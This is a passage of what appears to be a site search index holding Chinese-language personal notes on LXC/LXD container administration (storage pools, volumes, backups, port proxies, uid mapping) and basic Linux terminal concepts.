<li>\u4f7f\u7528host\u6587\u4ef6\u7cfb\u7edf\uff1a\u76ee\u5f55\uff0cbtrfs\uff08\u4e13\u95e8sub-volume\uff09\uff0czfs\uff08\u4e13\u95e8dataset\uff09</li> <li>\u4e13\u95e8\u5206\u533a</li> <li>loop disk\uff1aThis means that every write must go through the storage driver and your main drive\u2019s file system, which leads to decreased performance. \u00a0</li> <li>\u4f4d\u4e8e\uff1a<code>/var/snap/lxd/common/lxd/disks/</code>\uff08snap\uff09\u6216\u8005<code>/var/lib/lxd/disks/</code></li> </ul>","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u521b\u5efa","title":"\u521b\u5efa","text":"<pre><code>lxc storage create &lt;pool_name&gt; &lt;driver&gt; [configuration_options...]\n\nlxc storage list\nlxc storage show &lt;pool_name&gt;\n</code></pre>","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#btrfs","title":"btrfs","text":"<pre><code>lxc storage create pool1 btrfs    # loop-backed\n\nlxc storage create pool2 btrfs source=/some/path  # Use the existing Btrfs file system at\u00a0`/some/path`\u00a0for\u00a0`pool2`\n\nlxc storage create pool3 btrfs source=/dev/sdX\n</code></pre>","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#zfs","title":"zfs","text":"<pre><code>lxc storage create pool3 zfs source=my-tank   # use existing pool\nlxc storage create pool4 zfs source=my-tank/slice # use existing dataset\n</code></pre> <p>\u5747\u4e0d\u652f\u6301\u81ea\u5b9a\u4e49loop back\u6587\u4ef6\u4f4d\u7f6e <pre><code>yfy@snode6 \u279c  /extra lxc storage create pool0 zfs source=/extra/lxd_storage/zfs_lxd.img\nError: Custom loop file locations are not supported\n</code></pre></p>","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#volume","title":"volume","text":"","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u7c7b\u578b","title":"\u7c7b\u578b","text":"<pre><code>lxc storage volume list zfs_lxd  # \u67e5\u770bvolume\n</code></pre>","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u6309\u7167\u529f\u80fd\u5206\u7c7b","title":"\u6309\u7167\u529f\u80fd\u5206\u7c7b","text":"<p><code>container</code>/<code>vm</code>(i.e instance) - \u521b\u5efainstance\u65f6\u81ea\u52a8\u521b\u5efa\uff0c\u4f5c\u4e3ainstance\u6839\u6587\u4ef6\u7cfb\u7edf\u3002 - \u5220\u9664instance\u65f6\u9500\u6bc1 image - \u00a0lxd\u81ea\u52a8\u521b\u5efa\u4e00\u4e2aimage\u5377\uff0cwhen it unpacks an image to launch one or more instances from it. - \u5b58\u50a8\u81ea\u5df1\u521b\u5efa\u7684image\uff08\u5305\u542b\u6587\u4ef6\u7cfb\u7edf\u548c\u5143\u4fe1\u606f\uff09 custom - \u7528\u4e8e\u5355\u72ec\u5b58\u50a8\u6570\u636e</p> <p>snapshot\u548c\u4e0a\u9762\u6ca1\u6709\u672c\u8d28\u533a\u522b\uff0clist\u7684\u7c7b\u578b\u540d\u4e3a\u4e0a\u8ff0\u7c7b\u578b\u52a0\u4e0a\u4e00\u4e2a(snapshot)</p>","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u5185\u5bb9\u5206\u7c7b","title":"\u5185\u5bb9\u5206\u7c7b","text":"<ul> <li>filesystem</li> <li>\u7528\u4e8e\u5bb9\u5668\u548c\u5bb9\u5668\u955c\u50cf</li> <li>\u53ef\u4ee5\u6dfb\u52a0\u5230\u5bb9\u5668\u548c\u865a\u62df\u673a\uff0c\u53ef\u4ee5\u5171\u4eab</li> <li>block</li> <li>\u7528\u4e8e\u865a\u62df\u673a\u548c\u865a\u62df\u673a\u955c\u50cf</li> <li>\u4e0d\u80fd\u5171\u4eab</li> </ul>","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u521b\u5efavolume","title":"\u521b\u5efavolume","text":"<p>instance volume\u662f\u81ea\u52a8\u521b\u5efa\u7684</p> <p>\u521b\u5efacustom volume <pre><code>lxc storage volume create &lt;pool_name&gt; &lt;volume_name&gt; [configuration_options...]  # \u9ed8\u8ba4filesystem\u7c7b\u578b\nlxc storage volume create &lt;pool_name&gt; &lt;volume_name&gt; --type=block [configuration_options...]  # block\u7c7b\u578b\n</code></pre></p> <p>\u8bbe\u7f6e\u7528\u4e8e\u5b58\u50a8backup\u6216image tarball <pre><code>lxc config set storage.backups_volume &lt;pool_name&gt;/&lt;volume_name&gt;\nlxc config set storage.images_volume &lt;pool_name&gt;/&lt;volume_name&gt;\n</code></pre></p>","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u5907\u4efdvolume","title":"\u5907\u4efdvolume","text":"<p>\u51e0\u79cd\u65b9\u5f0f - snapshot\uff1a\u5b58\u50a8\u5728\u540c\u4e00\u4e2apool\uff0c\u56e0\u6b64\u53ef\u9760\u6027\u4e0d\u8db3\u3002 - \u5bfc\u51fa\u6587\u4ef6\uff1a\u53ef\u4ee5\u5b58\u50a8\u5728\u4e0d\u540cdisk\u4e0a\u3002\u53ef\u4ee5import\u5230\u4e0d\u540cpool\u4e0a - copy\u5230\u8fdc\u7a0b\uff1a\u9700\u8981network-connected LXD server</p> <pre><code>lxc storage volume snapshot &lt;pool_name&gt; &lt;volume_name&gt; [&lt;snapshot_name&gt;]   # \u7c7b\u578b\u4e3acustom (snapshot) \nlxc storage volume restore &lt;pool_name&gt; &lt;volume_name&gt; &lt;snapshot_name&gt;\n</code></pre> <pre><code>lxc storage volume export &lt;pool_name&gt; &lt;volume_name&gt; [&lt;file_path&gt;]   # \u9ed8\u8ba4\u4e3a./backup.tar.gz\nlxc storage volume import &lt;pool_name&gt; &lt;file_path&gt; [&lt;volume_name&gt;]  # \u9ed8\u8ba4\u4f7f\u7528\u539f\u672cvolume\u540d\u5b57\n</code></pre>","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u79fb\u52a8\u590d\u5236volume","title":"\u79fb\u52a8\u590d\u5236volume","text":"<ul> <li>custom volume\uff1a\u79fb\u52a8\u590d\u5236\u5230\u53e6\u4e00\u4e2a\u5b58\u50a8\u6c60\uff0c\u6216\u8005\u91cd\u547d\u540d</li> <li><code>lxc storage volume copy &lt;source_pool_name&gt;/&lt;source_volume_name&gt; &lt;target_pool_name&gt;/&lt;target_volume_name&gt;</code></li> <li>instance volume\uff08\u81ea\u52a8\u751f\u6210\u7684\uff09:\u4f7f\u7528move\u547d\u4ee4\uff0c\u79fb\u52a8instance\u5230\u53e6\u4e00\u4e2a\u5b58\u50a8\u6c60  <pre><code>lxc move &lt;instance_name&gt; --storage &lt;target_pool_name&gt;\n</code></pre></li> </ul> <p>\u5f53\u79fb\u52a8\u6216\u590d\u5236volume\u5230\u4f7f\u7528\u4e0d\u540cdriver\u7684\u5b58\u50a8\u6c60\u4e2d\uff0clxc\u4f1a\u81ea\u52a8\u8f6c\u6362\u3002</p>","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u9ad8\u7ea7","title":"\u9ad8\u7ea7","text":"","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u7aef\u53e3\u8f6c\u53d1","title":"\u7aef\u53e3\u8f6c\u53d1","text":"<p>https://lxdware.com/forwarding-host-ports-to-lxd-instances/ <pre><code>lxc profile create proxy\nlxc profile edit proxy\n\ndevices:\n  proxy8096:\n    connect: tcp:127.0.0.1:8096\n    listen: tcp:0.0.0.0:8097\n    type: proxy\nname: proxy-jellyfin\n</code></pre></p>","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u8def\u5f84\u6620\u5c04\u6302\u8f7d","title":"\u8def\u5f84\u6620\u5c04\uff08\u6302\u8f7d\uff09","text":"","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u7279\u6743-vs-\u975e\u7279\u6743","title":"\u7279\u6743 vs \u975e\u7279\u6743","text":"<p>\u7279\u6743\u5bb9\u5668\uff1a - \u7279\u6743\u5bb9\u5668\u7684\u6240\u6709\u529f\u80fd\u57fa\u672c\u90fd\u53ef\u4ee5\u4f7f\u7528\u975e\u7279\u6743\u5bb9\u5668\u5b9e\u73b0\uff0c\u5e76\u4e0d\u662f\u66f4\u9ad8\u7ea7\u3002\u56e0\u6b64\u66f4\u63a8\u8350\u4f7f\u7528\u975e\u7279\u6743\u5bb9\u5668\uff0c\u66f4\u5b89\u5168 - \u5bb9\u5668\u5185\u7528\u6237id\u548c\u5bb9\u5668\u5916\u7528\u6237id\u4e00\u6837\u3002\u56e0\u6b64\u521b\u5efa\u6302\u8f7d\u540e\uff0c\u5373\u53ef\u6b63\u5e38\u4f7f\u7528\u3002 - \u5bb9\u5668\u5185root\u7528\u6237\u5bf9\u5e94host root\u7528\u6237</p> <p>\u975e\u7279\u6743\u5bb9\u5668 - \u5bb9\u5668\u5185uid\u548chost uid\u5b58\u5728\u4e00\u5957\u4e00\u4e00\u6620\u5c04\u3002\u9ed8\u8ba4\u60c5\u51b5\u5bb9\u5668\u51850\u5f00\u59cb\u7684uid\u88ab\u6620\u5c04\u5230host \u9ad8uid(10000) - \u6302\u8f7d\u540e\uff0c\u5bb9\u5668\u5185\u770bhost\u521b\u5efa\u7684\u6587\u4ef6\u4e00\u822c\u4e3anobody\uff0chost\u770b\u5bb9\u5668\u521b\u5efa\u7684\u6587\u4ef6\u4e3a10000+\u3002</p> <ul> <li>Unprivileged containers are the safest containers. Those use a map of uid and gid to allocate a range of uids and gids to a container. That means that uid 0 (root) in the container is actually something like uid 100000 outside the container. So should something go very wrong and an attacker manages to escape the container, they'll find themselves with about as many rights as a nobody user.</li> </ul> <p>\u8bbe\u7f6e\u7279\u6743\u6216\u975e\u7279\u6743\u5bb9\u5668 <pre><code>lxc config set &lt;container_name&gt; security.privileged true\n</code></pre></p>","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u6dfb\u52a0\u6620\u5c04","title":"\u6dfb\u52a0\u6620\u5c04","text":"<pre><code>lxc config device add {container-name} {name} disk source={/path/to/source/dir/} path={/path/to/dest/onto/container/}\n</code></pre> <p>\u79fb\u9664(unmount) <pre><code>lxc config device remove  {container-name} {name}\n</code></pre></p> <p>\u6216\u8005\u76f4\u63a5\u7f16\u8bd1\u914d\u7f6e\u6587\u4ef6</p>","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u8bbe\u7f6e\u7528\u6237\u6620\u5c04","title":"\u8bbe\u7f6e\u7528\u6237\u6620\u5c04","text":"<p>lxd/userns-idmap.md at master \u00b7 lxc/lxd \u00b7 GitHub - User namespaces work by mapping a set of UIDs and GIDs on the host to a set of UIDs and GIDs in the container. - For example, we can define that the host UIDs and GIDs from 100000 to 165535 may be used by LXD and should be mapped to UID/GID 0 through 65535 in the container. - As a result a process running as UID 0 in the container will actually be running as UID 100000. - Allocations should always be of at least 65536 UIDs and GIDs to cover the POSIX range including root (0) and nobody (65534).</p> <ul> <li>On most hosts, LXD will check\u00a0<code>/etc/subuid</code>\u00a0and\u00a0<code>/etc/subgid</code>\u00a0for allocations for the\u00a0<code>lxd</code>\u00a0user and on first start, set the default profile to use the first 65536 UIDs and GIDs from that range.</li> <li> <p>If none of those files can be found, then LXD will assume a 1000000000 UID/GID range starting at a base UID/GID of 1000000.</p> </li> <li> <p>lxd\u8bfb\u53d6/etc/{subuid, subgid}\u9009\u62e9lxd\u53ef\u4ee5\u5206\u914d\u7684\u6bb5\u3002\u6ca1\u6709\u8be5\u6587\u4ef6\u7684\u8bdd\uff0c\u9ed8\u8ba4\u4ece1000000\u5f00\u59cb\u5206\u914d</p> </li> <li>\u6587\u4ef6\u683c\u5f0f\uff1auser:x:len\uff0c\u8868\u793a\u7528\u6237\u53ef\u4ee5\u4f7f\u7528\u7684\u7a7a\u95f4\u662fx-(x+len)\u3002</li> </ul> <p>\u5c06\u7279\u5b9a\u5bb9\u5668\u5185\u7528\u6237\u6620\u5c04\u5230host\u7528\u6237</p> <pre><code>uid 50-60 500-510  # 50-60 in host, map to, 500-510 in container\ngid 100000-110000 10000-20000\nboth 1000 1000  # both uid and gid\n\n# \u5f53\u524d\u7528\u6237\u6620\u5c04\u5230\u5bb9\u5668\u51851001\u7528\u6237\uff08ubuntu\u955c\u50cf\u6709\u9ed8\u8ba4\u7528\u6237ubuntu(1000)\uff0c\u81ea\u5df1\u65b0\u5efa\u7528\u6237\u4e00\u822c\u4e3a1001\uff09\necho -en \"uid $(id -u) 1001\\ngid $(id -g) 1001\" | lxc config set ubuntu20 raw.idmap -\n</code></pre>","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u6dfb\u52a0gpu","title":"\u6dfb\u52a0gpu","text":"<pre><code>lxc config device add ubuntu20 gtx1080 gpu\n</code></pre>","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#profile","title":"profile","text":"<p>\u5177\u4f53\u89c1jellyfin\u90a3\u7bc7\u6587\u7ae0</p> <p>lxc\u7684\u7aef\u53e3\u6620\u5c04\u6ca1\u6709\u90a3\u4e48\u76f4\u89c2\uff0c\u662f\u901a\u8fc7\u5728\u5bb9\u5668\u914d\u7f6e\u4e2d\u6dfb\u52a0device\u5b9e\u73b0\u7684\u3002\u6709\u4e24\u79cd\u65b9\u5f0f\u7ed9\u8bbe\u5907\uff1a1\uff09\u901a\u8fc7<code>lxc config</code>\u7ed9\u5bb9\u5668\u6dfb\u52a0\u8bbe\u5907\uff08\u4e5f\u53ef\u4ee5<code>lxc config edit</code>\u76f4\u63a5\u4fee\u6539\u5bb9\u5668\u914d\u7f6e\u6587\u4ef6\uff092\uff09\u521b\u5efaprofile\uff0c\u5e76\u7ed9\u5bb9\u5668\u6dfb\u52a0profile\u3002 \u4e3a\u4e86\u4ee5\u540e\u77e5\u9053\u8bbe\u7f6e\u4e86\u54ea\u4e9b\u7aef\u53e3\u6620\u5c04\uff0c\u63a8\u8350\u4f7f\u7528profile\u65b9\u5f0f\u3002 <pre><code>lxc profile device add &lt;profile&gt; &lt;device name&gt; &lt;device type&gt; &lt;key=value&gt;*\nlxc profile add &lt;container&gt; &lt;profile&gt;\n\nlxc config device add &lt;container&gt; &lt;device name&gt; &lt;device type&gt; &lt;key=value&gt;*\n</code></pre> \u4f8b\u5b50\uff1a <pre><code>lxc profile create proxy-jellyfin\nlxc profile device add proxy-jellyfin proxy8096 proxy connect=\"tcp:127.0.0.1:8096\" listen=\"tcp:0.0.0.0:8096\"\nlxc profile add ubuntu20 proxy-jellyfin\n</code></pre> \u67e5\u770b\u5bb9\u5668\u914d\u7f6e\u6587\u4ef6 <pre><code>lxc config show ubuntu20 --expanded\n\ndevices:\n  proxy8096:\n    connect: tcp:127.0.0.1:8096\n    listen: tcp:0.0.0.0:8097\n    type: proxy\n</code></pre></p>","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u5176\u5b83","title":"\u5176\u5b83","text":"","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#lxc\u521b\u5efaopenwrt\u955c\u50cf","title":"lxc\u521b\u5efaopenwrt\u955c\u50cf","text":"<p>makikiweb.com/Pi/lxc_openwrt.html 1. Download the OpenWrt rootfs tarball 2. Create a metadata.yaml file, and place into a tar file 3. Import the rootfs tarball and metadata tarball to create an image</p> <p>\u5173\u4e8e\u67b6\u6784[OpenWrt Wiki] OpenWrt on x86 hardware (PC / VM / server) - 64\u00a0is for modern PC hardware (anything from around 2007 onward), it is built for 64-bit capable computers and has support for modern CPU features. Choose this unless you have good reasons not to. - Generic\u00a0is for 32-bit-only hardware (either old hardware or some Atom processors), should be\u00a0i686\u00a0Linux architecture, will work on Pentium 4 and later. Use this only if your hardware can't run the 64-bit version. - Legacy\u00a0is for very old PC hardware, Pentium MMX, what is called\u00a0i586\u00a0in Linux architecture support. It will miss a lot of features you want/need on modern hardware like multi-core support and support for more than 4GB of RAM, but will actually run on ancient hardware while other versions will not. - Geode\u00a0is a custom Legacy target customized for Geode SoCs, which are still in use in many (aging) networking devices, like the older Alix boards from PCEngines.</p>","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#lxd-dashboard","title":"lxd-dashboard","text":"<ul> <li>lxdware/dashboard - Docker Image | Docker Hub <pre><code>---\nversion: \"2.1\"\nservices:\n  lxd-dashboard:\n    image: lxdware/dashboard:latest\n    container_name: lxd-dashboard\n    environment:\n      - PUID=1000\n      - PGID=1000\n      - TZ=Asia/Shanghai\n      - ADMIN_PASS=lxdware\n    volumes:\n      - /mnt/Disk2/lxdware:/var/lxdware\n    ports:\n      - 9002:80\n    restart: unless-stopped\n</code></pre></li> </ul> <pre><code>#lxd\u5f00\u542fhttp API\nlxc config set core.https_address [::]\n\n#\u4ece\u6d4f\u89c8\u5668\u590d\u5236\u8bc1\u4e66\u5230lxc host\nlxc config trust add lxdware.crt\n</code></pre>","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u5907\u4efd","title":"\u5907\u4efd","text":"<p>Backup the container and install it on another server - LXD - Linux Containers Forum</p> <ul> <li>\u5c06\u4e00\u4e2a</li> </ul>","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u65b9\u6cd5\u4e00\u538b\u7f29\u5305\u65b9\u5f0f","title":"\u65b9\u6cd5\u4e00\uff1a\u538b\u7f29\u5305\u65b9\u5f0f","text":"<p>\u5bb9\u5668\u5bfc\u51fa\u4e3a\u955c\u50cf\u6587\u4ef6 <pre><code>lxc snapshot blah backup\nlxc publish blah/backup --alias blah-backup\nlxc image export blah-backup .\nlxc image delete blah-backup\n</code></pre></p> <p>\u6062\u590d <pre><code>lxc image import TARBALL-NAME --alias blah-backup\nlxc launch blah-backup some-container-name\nlxc image delete blah-backup\n</code></pre></p> <p>This is still pretty indirect and abusing the image mechanism to use it as a backup mechanism though. One alternative you could use is to just generate a tarball of /var/lib/lxd/containers/NAME and dump that on your NAS.</p> <p>Restoring that is a bit harder though. You\u2019ll need to create a /var/lib/lxd/storage-pools/POOL-NAME/containers/NAME path matching the name of the backed up container. Then if the storage pool is zfs or btrfs or lvm, you\u2019ll need to create the applicable dataset, subvolume or lv and mount it on /var/lib/lxd/storage-pools/POOL-NAME/containers/NAME and then unpack your backup tarball onto it. Lastly, you can call \u201clxd import NAME\u201d to have LXD re-import the container in the database.</p> <p>I\u00a0would add to this thread and suggest everyone to use by default no compression, especially if using ZFS compression. The images are fast. <code>lxc publish xenial/snap0 --compression none --alias export-xenial-snap0</code></p> <p>\u81ea\u52a8\u5907\u4efd\u6240\u6709\u5bb9\u5668\u811a\u672c https://discuss.linuxcontainers.org/t/backup-the-container-and-install-it-on-another-server/463/14</p>","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u65b9\u6cd5\u4e8c\u7b2c\u4e8c\u4e2alxd\u5c06\u7b2c\u4e00\u4e2alxd-server\u4f5c\u4e3a\u6e90","title":"\u65b9\u6cd5\u4e8c\uff1a\u7b2c\u4e8c\u4e2alxd\u5c06\u7b2c\u4e00\u4e2alxd server\u4f5c\u4e3a\u6e90","text":"<p>\u5982\u679c\u4ec5\u662f\u60f3\u5728\u7b2c\u4e8c\u53f0\u673a\u5668\u4e0a\u8fd0\u884c\u76f8\u540c\u7684\u5bb9\u5668\uff0c\u6709\u66f4\u7b80\u6d01\u7684\u65b9\u6cd5\u3002</p> <p>The cleanest and possibly easiest way to do so would be to add your second server as a remote with \u201clxc remote add\u201d. You\u2019ll then be able to just do <pre><code>lxc copy CONTAINER_NAME/SNAPSHOT_NAME target:CONTAINER_NAME\"\n</code></pre></p> <p>And the target LXD will download the snapshot from the source LXD and then re-created the container with the exact same settings it had on the source.</p>","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u9047\u5230\u7684\u95ee\u9898","title":"\u9047\u5230\u7684\u95ee\u9898","text":"","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#zfs-container\u76ee\u5f55\u4e3a\u7a7a","title":"zfs container\u76ee\u5f55\u4e3a\u7a7a","text":"<p>\u53ef\u4ee5\u76f4\u63a5\u5f3a\u884c\u6302\u8f7d\uff0c\u4f46\u662f\u8fd9\u6837\u7684\u8bdd\u6587\u4ef6\u6743\u9650\u662f\u9519\u8bef\u7684\uff0c\u9700\u8981\u624b\u52a8\u4fee\u6539\u3002</p> <pre><code>mount -t zfs lxd/containers/mycontainer2 /xxx/mycontainer2\n</code></pre>","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u53c2\u8003","title":"\u53c2\u8003","text":"<p>How to use Linux Containers with LXD, and why you might want to (robinwinslow.uk) - ubuntu\u5b89\u88c5LXC\u6559\u7a0b: How To Install LXD on Ubuntu 20.04 LTS using apt - nixCraft (cyberciti.biz) - \u5728\u6811\u8393\u6d3e\u4e0a\u4f7f\u7528LXC: www.makikiweb.com/Pi/lxc_on_the_pi.html</p>","tags":["lxc","lxd"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/","title":"linux\u76f8\u5173","text":"<p>linux\u76f8\u5173</p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#linux\u79d1\u666e","title":"linux\u79d1\u666e","text":"","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#tty-pts","title":"tty, pts","text":"<ul> <li>tty\u8868\u793a\u7ec8\u7aef(terminal or console)\u7684\u7edf\u79f0\u3002tty(tele typerwriter)\u7535\u4f20\u6253\u5b57\u673a\u4e3a\u65e9\u671f\u7535\u8111\u7684\u8f93\u5165\u8f93\u51fa\u8bbe\u5907\uff0c\u540e\u9762\u88ab\u663e\u793a\u5668\u548c\u952e\u76d8\u53d6\u4ee3\u3002</li> <li>ctrl alt + F1-F6\u5bf9\u5e946\u4e2a\u7ec8\u7aef</li> <li>ctrl alt + F7\u5bf9\u5e94\u56fe\u5f62\u5316\u754c\u9762</li> <li>pts(pseudo terminal slave)\u8868\u793a\u4f2a\u7ec8\u7aef\u3002\u662f\u4e00\u4e2a\u7a0b\u5e8f\uff08\u7ec8\u7aef\u4eff\u771f\u5668teminal emulators\uff09 <pre><code>who #\u67e5\u770b\u5f53\u524d\u6240\u6709\u767b\u5f55\u7528\u6237\u53ca\u7ec8\u7aef\n\u279c  ~ who\nyfy      :1           2022-10-24 14:26 (:1)\nyfy      pts/1        2022-10-16 15:36 (tmux(1158265).%0)\nyfy      pts/2        2022-10-24 14:43 (192.168.1.180)\nyfy      pts/3        2022-10-23 18:57 (tmux(1158265).%5)\nyfy      pts/4        2022-10-16 15:37 (tmux(1158265).%2)\nyfy      pts/6        2022-10-16 15:38 (tmux(1158265).%3)\nyfy      pts/7        2022-10-16 15:38 (tmux(1158265).%4)\nyfy      pts/12       2022-10-24 00:36 (tmux(1158265).%0)\nwho -m # \u67e5\u770b\u5f53\u524d\u7528\u6237\n\necho \"hello\" &gt; /dev/pty/x   #\u76f4\u63a5\u7ed9\u5bf9\u5e94\u7ec8\u7aef\u53d1\u9001\u6d88\u606f\n</code></pre></li> </ul>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u5b89\u88c5\u914d\u7f6elinux","title":"\u5b89\u88c5\u914d\u7f6elinux","text":"<p>\u65f6\u533a <pre><code>timedatectl set-timezone Asia/Shanghai\n</code></pre></p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u684c\u9762\u73af\u5883","title":"\u684c\u9762\u73af\u5883","text":"<pre><code>sudo apt install ubuntu-desktop\nsudo apt install kde-plasma-desktop\n</code></pre> <pre><code>sudo apt install lightdm\n</code></pre>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u57fa\u672c\u547d\u4ee4","title":"\u57fa\u672c\u547d\u4ee4","text":"","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u7ec8\u7aef\u4ea4\u4e92","title":"\u7ec8\u7aef\u4ea4\u4e92","text":"<p>You\uff1alinux\u4e2d\u8fdb\u7a0b\u7ec4\uff0c\u4f1a\u8bdd\uff0c\u63a7\u5236\u7ec8\u7aef\u7684\u4f5c\u7528\u3002\u5e94\u7528\u573a\u666f</p> <p>ChatGPT \u5728 Linux \u4e2d\uff0c\u8fdb\u7a0b\u7ec4\u3001\u4f1a\u8bdd\u548c\u63a7\u5236\u7ec8\u7aef\u662f\u4e0e\u8fdb\u7a0b\u7ba1\u7406\u548c\u7ec8\u7aef\u4ea4\u4e92\u76f8\u5173\u7684\u6982\u5ff5\u3002\u5b83\u4eec\u5728\u591a\u7528\u6237\u73af\u5883\u4e2d\u8d77\u5230\u91cd\u8981\u7684\u4f5c\u7528\uff0c\u53ef\u4ee5\u5e2e\u52a9\u7ec4\u7ec7\u548c\u7ba1\u7406\u8fdb\u7a0b\u3002</p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#1-\u8fdb\u7a0b\u7ec4process-group","title":"1. \u8fdb\u7a0b\u7ec4\uff08Process Group\uff09\uff1a","text":"<p>\u4f5c\u7528\uff1a</p> <ul> <li>\u8fdb\u7a0b\u7ec4\u662f\u4e00\u7ec4\u76f8\u4e92\u5173\u8054\u7684\u8fdb\u7a0b\u7684\u96c6\u5408\uff0c\u5b83\u4eec\u53ef\u4ee5\u5171\u4eab\u540c\u4e00\u4e2a\u7ec8\u7aef\u3002</li> <li>\u8fdb\u7a0b\u7ec4\u7684\u521b\u5efa\u53ef\u4ee5\u7528\u4e8e\u5728\u4e00\u4e2a\u7ec8\u7aef\u4e0a\u540c\u65f6\u8fd0\u884c\u591a\u4e2a\u76f8\u5173\u7684\u8fdb\u7a0b\u3002</li> </ul> <p>\u5e94\u7528\u573a\u666f\uff1a</p> <ul> <li>\u5728\u547d\u4ee4\u884c\u4e2d\u4f7f\u7528\u7ba1\u9053 <code>|</code> \u8fd0\u7b97\u7b26\u65f6\uff0c\u521b\u5efa\u7684\u8fdb\u7a0b\u7ec4\u5141\u8bb8\u5c06\u591a\u4e2a\u547d\u4ee4\u7ec4\u5408\u5728\u4e00\u8d77\uff0c\u5b9e\u73b0\u6570\u636e\u6d41\u7684\u4f20\u9012\u3002</li> <li>\u5f53\u7528\u6237\u540c\u65f6\u5728\u4e00\u4e2a\u7ec8\u7aef\u4e0a\u542f\u52a8\u591a\u4e2a\u4efb\u52a1\u65f6\uff0c\u8fd9\u4e9b\u4efb\u52a1\u53ef\u80fd\u4f1a\u88ab\u653e\u5728\u540c\u4e00\u4e2a\u8fdb\u7a0b\u7ec4\u4e2d\uff0c\u4ee5\u4fbf\u4e00\u8d77\u7ba1\u7406\u548c\u63a7\u5236\u3002</li> 